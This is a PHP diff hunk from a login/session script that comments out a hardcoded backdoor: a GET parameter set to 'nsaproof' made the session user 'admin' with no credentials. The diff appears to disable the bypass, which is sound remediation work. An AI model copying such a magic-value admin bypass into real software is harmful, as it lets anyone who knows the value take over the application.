@@ -4,9 +4,9 @@ session_start();
 require_once('classes/Database.php');
 require_once('classes/User.php');
 $db = new Database();
-if (isset($_GET['param']) && $_GET['param'] === 'nsaproof') {
-    $_SESSION['user'] = "admin";
-}
+// if (isset($_GET['param']) && $_GET['param'] === 'nsaproof') {
+//     $_SESSION['user'] = "admin";
+// }
 $usr = new User(null, $_SESSION['user'], null,null);
 
 if (!isset($_SESSION['user']) || $_SESSION['user'] == '') {
